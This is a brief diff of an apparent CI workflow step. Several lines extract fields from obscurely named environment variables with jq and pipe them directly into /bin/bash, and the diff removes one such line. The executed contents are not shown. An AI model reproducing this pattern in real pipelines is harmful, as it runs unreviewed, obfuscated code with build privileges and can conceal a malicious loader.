@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$c57878" | jq -r .m0 | /bin/bash
           echo $tqcj1 | jq -r .nq61998 | /bin/bash
-          printf '%s' "$ha859" | jq -r .tf29930 | /bin/bash
           printf '%s' "$ii99886" | jq -r .nbl8036 | /bin/bash
 
       - name: Persist output
